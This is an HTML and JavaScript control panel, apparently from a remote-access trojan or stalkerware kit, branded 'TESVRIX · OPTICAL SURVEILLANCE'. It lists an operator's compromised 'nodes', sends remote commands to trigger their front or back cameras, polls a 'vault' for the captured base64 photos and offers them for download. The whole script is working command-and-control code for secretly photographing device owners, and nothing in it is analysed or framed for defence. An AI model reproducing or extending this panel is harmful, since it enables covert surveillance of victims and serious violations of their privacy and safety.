<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TESVRIX · OPTICAL SURVEILLANCE</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --primary-glow: rgba(225, 29, 72, 0.45);
            --primary-dark: #be123c;
            --bg-deep: #020617;
            --bg-surface: #0f172a;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --accent-green: #10b981;
            --accent-red: #ef4444;
            --transition-smooth: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        body { background: radial-gradient(ellipse at 20% 30%, #0a0f1f, var(--bg-deep)); font-family: 'Inter', sans-serif; color: var(--text-primary); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }

        .cam-container {
            width: 100%;
            max-width: 1000px;
            background: rgba(15, 23, 42, 0.7);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            display: flex;
            flex-direction: column;
            overflow: hidden;
            height: 90vh;
        }

        .header {
            padding: 20px 30px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: linear-gradient(95deg, rgba(225,29,72,0.08), transparent);
        }

        .header h1 {
            font-family: 'Space Grotesk';
            font-size: 1.2rem;
            letter-spacing: 2px;
            background: linear-gradient(135deg, #fff, var(--primary));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .controls {
            padding: 15px 30px;
            display: flex;
            gap: 15px;
            background: rgba(0,0,0,0.2);
        }

        .btn-action {
            flex: 1;
            padding: 12px;
            border-radius: 12px;
            border: 1px solid rgba(255,255,255,0.1);
            background: rgba(30, 41, 59, 0.5);
            color: #fff;
            font-family: 'Space Grotesk';
            font-weight: 700;
            font-size: 0.75rem;
            cursor: pointer;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-action:hover {
            background: var(--primary);
            border-color: transparent;
            box-shadow: 0 0 15px var(--primary-glow), 0 4px 15px rgba(225,29,72,0.2);
            transform: translateY(-2px);
        }

        .main-content {
            flex: 1;
            display: flex;
            overflow: hidden;
        }

        .view-area {
            flex: 2;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            position: relative;
            background: #000;
            border-right: 1px solid rgba(255, 255, 255, 0.05);
        }

        #capturedImage {
            max-width: 100%;
            max-height: 100%;
            border-radius: 12px;
            box-shadow: 0 0 30px rgba(0,0,0,0.5);
            display: none;
            object-fit: contain;
        }

        .gallery {
            flex: 1;
            padding: 20px;
            background: rgba(0,0,0,0.3);
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .gallery-header {
            font-family: 'Space Grotesk';
            font-size: 0.8rem;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
        }

        .photo-item {
            position: relative;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.1);
            cursor: pointer;
            transition: transform 0.2s;
            aspect-ratio: 16/9;
            background: #000;
        }

        .photo-item.active-slot {
            border-color: var(--accent-green);
            box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);
        }

        .btn-mini-download {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .photo-item .time {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            padding: 8px;
            font-size: 0.65rem;
            color: #fff;
            font-family: 'Space Grotesk';
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .btn-mini-download {
            background: var(--primary);
            color: #fff;
            border: none;
            width: 22px;
            height: 22px;
            border-radius: 6px;
            font-size: 0.6rem;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn-mini-download:hover {
            transform: scale(1.1);
            background: #fff;
            color: var(--primary);
        }

        .placeholder {
            text-align: center;
            color: var(--text-secondary);
        }

        .placeholder i {
            font-size: 3rem;
            color: var(--primary);
            margin-bottom: 15px;
            opacity: 0.5;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.3; }
            50% { transform: scale(1.1); opacity: 0.6; }
            100% { transform: scale(1); opacity: 0.3; }
        }

        .status-badge {
            position: absolute;
            top: 20px;
            right: 20px;
            background: rgba(0,0,0,0.8);
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 0.65rem;
            font-weight: 800;
            border: 1px solid var(--primary);
            color: var(--primary);
            display: none;
            z-index: 10;
        }

        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid rgba(225,29,72,0.1);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
        }
        @keyframes spin { 100% { transform: rotate(360deg); } }

        .node-selector {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(255,255,255,0.1);
            color: #fff;
            padding: 6px 12px;
            border-radius: 10px;
            font-family: 'Space Grotesk';
            font-size: 0.75rem;
            outline: none;
            min-width: 180px;
        }

        .btn-mini-filter {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
            color: var(--text-secondary);
            padding: 4px 8px;
            border-radius: 8px;
            font-size: 0.6rem;
            font-weight: 800;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn-mini-filter.active {
            background: var(--primary);
            color: #fff;
            border-color: transparent;
        }

        @keyframes pulseDot { 0%, 100% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.3); opacity: 0.6; } }
        .live-dot-active { background: var(--accent-green) !important; box-shadow: 0 0 10px var(--accent-green); animation: pulseDot 2s infinite; }

        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: var(--primary); border-radius: 10px; }
    
        /* UNIVERSAL MOBILE RESPONSIVE FIX */
        @media (max-width: 992px) {
            body { padding: 10px; height: auto !important; min-height: 100vh; overflow-y: auto !important; }
            .cam-container { backdrop-filter: none !important; -webkit-backdrop-filter: none !important; background-color: rgba(15, 23, 42, 0.98); } /* Performance fix */
            .dashboard, .cam-container, .main-card, .container, .app-container, .split-layout {
                flex-direction: column !important;
                height: auto !important;
                min-height: 100vh;
                width: 100% !important;
                max-width: 100% !important;
                margin: 0 !important;
                border-radius: 16px !important;
            }
            .device-panel, .detail-panel, .sidebar, .main-area, .view-area, .gallery, .split-left, .split-right, .left-panel, .right-panel {
                width: 100% !important;
                max-width: 100% !important;
                height: auto !important;
                flex: none !important;
                min-height: 200px;
                border-right: none !important;
                border-bottom: 1px solid rgba(255,255,255,0.05);
            }
            .stats-grid, .perm-list, .grid-container {
                grid-template-columns: 1fr !important;
            }
            .header, .panel-header, .controls { 
                flex-wrap: wrap; 
                gap: 10px; 
            }
            .node-selector, .search-field { 
                width: 100% !important; 
                min-width: 100% !important;
            }
            .stat-tile { margin-bottom: 10px; }
        }

    
        /* PREMIUM SCROLLBAR */
        ::-webkit-scrollbar { width: 10px !important; height: 10px !important; }
        ::-webkit-scrollbar-track { background: rgba(2, 6, 23, 0.6) !important; border-radius: 10px !important; }
        ::-webkit-scrollbar-thumb { 
            background: #e11d48 !important; 
            border-radius: 10px !important; 
            border: 3px solid rgba(2, 6, 23, 0.6) !important; 
        }
        ::-webkit-scrollbar-thumb:hover { background: #f43f5e !important; }

    </style>
</head>
<body>
    <div class="cam-container">
        <div class="header">
            <div style="display: flex; align-items: center; gap: 15px;">
                <h1><i class="fas fa-eye"></i> OPTICAL UPLINK</h1>
                <div id="statusIndicator" style="display: flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.4); padding: 4px 12px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.08);">
                    <span id="liveDot" style="width: 8px; height: 8px; border-radius: 50%; background: #64748b;"></span>
                    <span id="liveStatusText" style="font-size: 0.6rem; font-weight: 800; letter-spacing: 1px; color: var(--text-secondary);">SEARCHING...</span>
                </div>
            </div>
            <div style="display: flex; gap: 10px; align-items: center;">
                <div style="display: flex; gap: 5px;">
                    <button onclick="setFilter('all')" id="btnAll" class="btn-mini-filter active">ALL</button>
                    <button onclick="setFilter('online')" id="btnOnline" class="btn-mini-filter" style="color: var(--accent-green);">ON</button>
                </div>
                <select id="deviceSelector" class="node-selector"></select>
            </div>
        </div>

        <div class="controls">
            <button class="btn-action" onclick="capture(1)"><i class="fas fa-portrait"></i> Capture Front</button>
            <button class="btn-action" onclick="capture(0)"><i class="fas fa-camera-rotate"></i> Capture Back</button>
        </div>

        <div class="main-content">
            <div class="view-area">
                <div id="status" class="status-badge">CAPTURING...</div>
                <div id="loader" class="loader"></div>
                <div id="placeholder" class="placeholder">
                    <i class="fas fa-video-slash"></i>
                    <p style="font-family: 'Space Grotesk'; letter-spacing: 1px;">AWAITING OPTICAL FEED</p>
                    <p style="font-size: 0.6rem; margin-top: 10px;">Select a capture to view or transmit new</p>
                </div>
                <img id="capturedImage" alt="Captured Frame">

                <div id="previewActions" style="position: absolute; bottom: 20px; display: none; gap: 10px;">
                    <button onclick="downloadImage()" class="btn-action" style="width: auto; padding: 10px 20px;">
                        <i class="fas fa-download"></i> Download
                    </button>
                    <button onclick="resetUI()" class="btn-action" style="width: auto; padding: 10px 20px; background: rgba(0,0,0,0.5);">
                        <i class="fas fa-times"></i> Close
                    </button>
                </div>
            </div>

        <div class="gallery">
            <div class="gallery-header">
                <span><i class="fas fa-images"></i> Vault Gallery</span>
                <div style="display: flex; gap: 10px; align-items: center;">
                    <span id="photoCount">0/5</span>
                    <button onclick="loadGallery()" class="btn-mini-filter" style="background: var(--primary); color: #fff; padding: 2px 6px;">
                        <i class="fas fa-sync-alt"></i>
                    </button>
                </div>
            </div>
                <div id="galleryList" style="display: flex; flex-direction: column; gap: 10px;">
                    <!-- Photos will appear here -->
                </div>
            </div>
        </div>
    </div>

    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    <script>
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let selectedId = null;
        let lastPhotoId = null;
        let filterMode = 'all';
        let allDevices = [];

        async function fetchDevices() {
            try {
                const r = await fetch(getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`), { headers: getApiHeaders() });
                const data = await r.json();
                allDevices = data;
                renderDeviceList();
            } catch (e) {
                console.error("Device Fetch Error:", e);
            }
        }

        function renderDeviceList() {
            const now = new Date();
            const filtered = allDevices.filter(d => {
                const online = (now - new Date(d.last_seen)) < 35000;
                if (filterMode === 'online') return online;
                return true;
            });

            const sel = document.getElementById('deviceSelector');
            const prevVal = sel.value;

            sel.innerHTML = filtered.map(d => {
                const online = (now - new Date(d.last_seen)) < 35000;
                return `<option value="${d.device_uuid}" ${d.device_uuid === selectedId ? 'selected' : ''}>
                    ${online ? '●' : '○'} ${d.device_name || 'NODE'} ${online ? '[ONLINE]' : '[OFFLINE]'}
                </option>`;
            }).join('');

            if (!selectedId && filtered[0]) {
                selectedId = filtered[0].device_uuid;
                loadGallery();
            }

             // Update Status Indicators
            const current = allDevices.find(d => d.device_uuid === selectedId);
            if (current) {
                const online = (now - new Date(current.last_seen)) < 35000;
                const dot = document.getElementById('liveDot');
                const text = document.getElementById('liveStatusText');

                if (online) {
                    dot.className = 'live-dot-active';
                    text.innerText = 'LINK SECURE';
                    text.style.color = 'var(--accent-green)';
                } else {
                    dot.className = '';
                    dot.style.background = '#64748b';
                    text.innerText = 'UPLINK LOST';
                    text.style.color = 'var(--accent-red)';
                }
            }
        }

        function setFilter(mode) {
            filterMode = mode;
            document.getElementById('btnAll').classList.toggle('active', mode === 'all');
            document.getElementById('btnOnline').classList.toggle('active', mode === 'online');
            renderDeviceList();
        }

        document.getElementById('deviceSelector').onchange = (e) => {
            selectedId = e.target.value;
            resetUI();
            lastPhotoId = null;  // Reset to force show new photo
            loadGallery();
            renderDeviceList();
        };

        function resetUI() {
            document.getElementById('capturedImage').style.display = 'none';
            document.getElementById('placeholder').style.display = 'block';
            document.getElementById('previewActions').style.display = 'none';
        }

        async function capture(camId) {
            if (!selectedId) return;

            document.getElementById('status').innerText = "TRANSMITTING COMMAND...";
            document.getElementById('status').style.display = 'block';
            document.getElementById('loader').style.display = 'block';

            try {
                const body = {
                    device_uuid: selectedId,
                    type: '/camera',
                    status: 'pending',
                    data: JSON.stringify({ camera_id: camId }),
                    operator_id: auth.operator_id
                };

                console.log("[CAM] Transmitting capture signal for:", selectedId);

                 // FIXED: Use getApiUrl with "commands" to ensure proper rest/v1/routing
                const response = await fetch(getApiUrl("commands"), {
                    method: 'POST',
                    headers: getApiHeaders(),
                    body: JSON.stringify(body)
                });

                if (!response.ok) {
                    const errText = await response.text();
                    document.getElementById('status').innerText = "UPSTREAM ERR: " + response.status;
                    throw new Error(`Signal Rejected: ${response.status}`);
                }

                document.getElementById('status').innerText = "AWAITING HARDWARE RESPONSE...";

                 // Ultra-Fast Polling (every 1.5s)
                let attempts = 0;
                const poll = setInterval(async () => {
                    attempts++;
                    await loadGallery();
                    if (attempts > 30) {
                        clearInterval(poll);
                        if (document.getElementById('status').innerText !== "PHOTO RECEIVED") {
                            document.getElementById('status').innerText = "LINK TIMEOUT";
                            document.getElementById('status').style.color = "var(--accent-red)";
                            setTimeout(() => {
                                document.getElementById('status').style.display = 'none';
                                document.getElementById('status').style.color = "var(--primary)";
                                document.getElementById('loader').style.display = 'none';
                            }, 3000);
                        }
                    }
                }, 1500);

                window.currentCapturePoll = poll;

            } catch (e) {
                console.error("Capture Error:", e);
                document.getElementById('status').innerText = "SIGNAL FAILED";
                document.getElementById('loader').style.display = 'none';
                setTimeout(() => { document.getElementById('status').style.display = 'none'; }, 3000);
            }
        }

        async function loadGallery() {
            if (!selectedId) return;
            try {
                const r = await fetch(getApiUrl(`vault?device_uuid=eq.${selectedId}&type=eq.camera_photo&order=id.desc&limit=10`), {
                    headers: {
                        ...getApiHeaders(),
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache'
                    }
                });

                const resData = await r.json();

                const list = document.getElementById('galleryList');
                if (!resData || !Array.isArray(resData) || resData.length === 0) {
                    list.innerHTML = '<div style="text-align:center; padding:40px; color:#64748b;"><i class="fas fa-database" style="font-size:2rem; margin-bottom:10px;"></i><p>VAULT IS EMPTY</p><small>No photos found for this device</small></div>';
                    return;
                }

                const photos = resData.map((row, index) => {
                    let content = row.content;
                    let finalSrc = content;
                    if (content && !content.startsWith("data:image")) {
                        finalSrc = "data:image/jpeg;base64," + content.replace(/[\n\r\s]/g, "");
                    }
                    return { id: row.id, src: finalSrc, isNew: index === 0 };
                }).filter(p => p.src && p.src.length > 100);

                document.getElementById('photoCount').innerText = `${photos.length}/10`;
                window.vaultGalleryData = photos;

                if (photos.length === 0) {
                    list.innerHTML = '<p style="text-align:center; padding:20px; color:gray;">NO VALID DATA FOUND</p>';
                    return;
                }

                // Show latest automatically
                if (resData[0].id !== lastPhotoId) {
                    const latest = photos[0];
                    if (latest) {
                        displayImage(latest.src);
                        if (lastPhotoId !== null) {
                            showStatusFeedback("PHOTO RECEIVED", "var(--accent-green)");
                            stopActivePoll();
                        }
                    }
                    lastPhotoId = resData[0].id;
                }

                list.innerHTML = photos.map((p, idx) => `
                    <div class="photo-item ${p.isNew ? 'active-slot' : ''}" onclick="viewVaultPhoto(${idx})">
                        <img src="${p.src}" onerror="this.src='https://via.placeholder.com/300?text=CORRUPTED+DATA'" style="object-fit: cover; width:100%; height:100%;">
                        <div class="time">
                            <span>PHOTO #${p.id} ${p.isNew ? '(NEW)' : ''}</span>
                            <button class="btn-mini-download" onclick="event.stopPropagation(); downloadImage(window.vaultGalleryData[${idx}].src)">
                                <i class="fas fa-download"></i>
                            </button>
                        </div>
                    </div>
                `).join('');

            } catch (e) {
                console.error("Critical Display Error:", e);
                document.getElementById('galleryList').innerHTML = '<p style="color:red; text-align:center;">FETCH ERROR: Check Console</p>';
            }
        }


         // New safe viewer for massive base64 strings
        function viewVaultPhoto(index) {
            const photo = window.vaultGalleryData[index];
            if (photo) displayImage(photo.src);
        }

        function downloadImageFromData(index) {
            const photo = window.vaultGalleryData[index];
            if (photo) downloadImage(photo.src);
        }

        function showStatusFeedback(text, color) {
            const status = document.getElementById('status');
            status.innerText = text;
            status.style.color = color;
            setTimeout(() => {
                status.style.display = 'none';
                status.style.color = "var(--primary)";
                document.getElementById('loader').style.display = 'none';
            }, 2500);
        }

        function stopActivePoll() {
            if (window.currentCapturePoll) {
                clearInterval(window.currentCapturePoll);
                window.currentCapturePoll = null;
            }
        }

        function displayImage(url) {
            const img = document.getElementById('capturedImage');
            img.src = url;
            img.onload = () => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('placeholder').style.display = 'none';
                img.style.display = 'block';
                document.getElementById('previewActions').style.display = 'flex';
            };
        }

        function downloadImage(customUrl) {
            const url = customUrl || document.getElementById('capturedImage').src;
            if (!url || url.includes('placeholder')) return;

            const a = document.createElement('a');
            a.href = url;
            a.download = `VAULT_CAPTURE_${new Date().getTime()}.jpg`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        }

         // Initial setup
        fetchDevices();
        setInterval(fetchDevices, 8000);  // Sync device list & status
        setInterval(loadGallery, 10000);  // Periodic refresh
    </script>
</body>
</html>
